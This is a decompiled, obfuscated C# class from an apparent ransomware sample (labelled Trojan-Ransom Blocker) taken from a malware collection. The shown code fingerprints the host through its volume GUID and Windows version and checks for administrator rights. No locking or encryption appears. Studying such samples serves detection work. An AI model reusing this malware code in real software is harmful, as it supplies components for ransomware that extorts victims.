// Decompiled with JetBrains decompiler
// Type: M6-n.e #"U=dki
// Assembly: ]\r, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 954C3D5E-708C-4DD0-82B7-DE2C5BD9F148
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b8539742a30b177b50768aa3e2c5af8a1f70cde6bd248fc157300ef1b9642f75.exe

using M\u000E6\u002Dn\u0008;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace M\u000E6\u002Dn\u0008
{
  internal class e\u0020\u0023\u0022U\u003Ddki
  {
    public static string i\u001Fe()
    {
      IntPtr ptr = Marshal.AllocHGlobal((int) byte.MaxValue);
      e\u0020\u0023\u0022U\u003Ddki.\u0021\u0083\u0007\u0028\u0009(Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001B\u005B\u0020()) + \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.n\u0007Y5(), ptr, (uint) byte.MaxValue);
      string stringUni = Marshal.PtrToStringUni(ptr);
      string str = stringUni.Substring(stringUni.IndexOf('{'));
      return str.Substring(0, str.IndexOf('}') + 1).Trim();
    }

    public static bool B\u0002\u0001()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch
      {
        return false;
      }
    }

    public static string S\u0026()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0025\u0019();
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (osVersion.Version.Minor)
        {
          case 0:
            str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0025\u0002z\u002Bx\u0021\u007C();
            break;
          case 10:
            str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u002Bm();
            break;
          case 90:
            str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0031\u0018U();
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (osVersion.Version.Major)
        {
          case 3:
            str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.D\u0026\u0024\u0028\u0016();
            break;
          case 4:
            str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0034\u0006N\u0024r\u005E\u0084();
            break;
          case 5:
            str = osVersion.Version.Minor != 0 ? \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001B\u000C\u0006\u0008() : \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.f\u0016\u0086\u0085\u000E1();
            break;
          case 6:
            switch (osVersion.Version.Minor)
            {
              case 0:
                str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0033\u0026\u0017\u000C\u002B();
                break;
              case 1:
                str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.D\u0019\u002F();
                break;
              case 2:
                str = \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u0006\u003DR\u001A\u005DI\u002BN\u002A();
                break;
            }
            break;
        }
      }
      return str + (string.IsNullOrEmpty(Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.\u001C\u0028\u002C())) ? \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.a\u0090\u0020\u0014\u0021c\u001EW0() : \u003CPrivateImplementationDetails\u003E\u007B0FEE17AE\u002DBF48\u002D4D24\u002DA538\u002D55E3AAA64C27\u007D.i\u002E\u0001\u003C\u003F());
    }

    [DllImport("kernel32", EntryPoint = "GetVolumeNameForVolumeMountPoint", CharSet = CharSet.Unicode)]
    private static extern bool \u0021\u0083\u0007\u0028\u0009(
      string _param0,
      IntPtr _param1,
      uint _param2);
  }
}
